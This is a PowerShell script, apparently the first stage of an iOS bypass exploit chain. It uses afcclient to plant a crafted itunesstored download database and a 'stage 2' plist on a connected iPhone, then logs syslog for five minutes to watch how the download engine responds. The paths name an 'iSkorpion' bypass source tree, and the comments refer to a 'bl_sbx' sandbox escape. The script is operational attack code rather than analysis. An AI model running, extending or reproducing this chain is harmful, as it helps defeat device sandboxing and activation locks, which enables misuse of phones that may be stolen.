# Phase A: plant the crafted bl_sbx download database, reboot the device, and
# capture what the download engine actually does.
#
# Planted files (all removable later):
#   /Downloads/downloads.28.sqlitedb      crafted itunesstored download DB
#   /Downloads/downloads.28.sqlitedb-wal  empty (clears the device's stale WAL)
#   /Downloads/downloads.28.sqlitedb-shm  empty
#   /SBX-STAGE2-PLIST.plist               plist referenced by the crafted bookassetd row

$ErrorActionPreference = 'Continue'
$UDID = '00008030-001C499814C0802E'
$AFC = 'E:\bypass\iSkorpion-Bypass-Source-Code-main\Runtime\x64\afcclient.exe'
$SYSLOG = 'E:\bypass\iSkorpion-Bypass-Source-Code-main\Runtime\x64\idevicesyslog.exe'
$SBX = 'E:\bypass\work\sbx'
$LOG = 'E:\bypass\work\live\phaseA.log'
$ERR = 'E:\bypass\work\live\phaseA.err'

Remove-Item $LOG, $ERR -ErrorAction SilentlyContinue
New-Item -ItemType File -Path "$SBX\empty.bin" -Force | Out-Null

Write-Host "== device check =="
& $AFC -u $UDID ls / 2>&1 | Out-String -Width 160

Write-Host "== planting =="
& $AFC -u $UDID put "$SBX\crafted-downloads.28.sqlitedb" /Downloads/downloads.28.sqlitedb 2>&1 | Out-String -Width 160
& $AFC -u $UDID put "$SBX\empty.bin" /Downloads/downloads.28.sqlitedb-wal 2>&1 | Out-String -Width 160
& $AFC -u $UDID put "$SBX\empty.bin" /Downloads/downloads.28.sqlitedb-shm 2>&1 | Out-String -Width 160
& $AFC -u $UDID put "$SBX\sbx-plist.plist" /SBX-STAGE2-PLIST.plist 2>&1 | Out-String -Width 160

Write-Host "== planted tree =="
& $AFC -u $UDID ls /Downloads 2>&1 | Out-String -Width 160
& $AFC -u $UDID ls / 2>&1 | Out-String -Width 160

Write-Host "== starting syslog capture =="
$end = (Get-Date).AddSeconds(300)
while ((Get-Date) -lt $end) {
    & $SYSLOG -u $UDID *>> $LOG
    Start-Sleep -Seconds 3
}
Write-Host "capture ended, size=$((Get-Item $LOG).Length)"
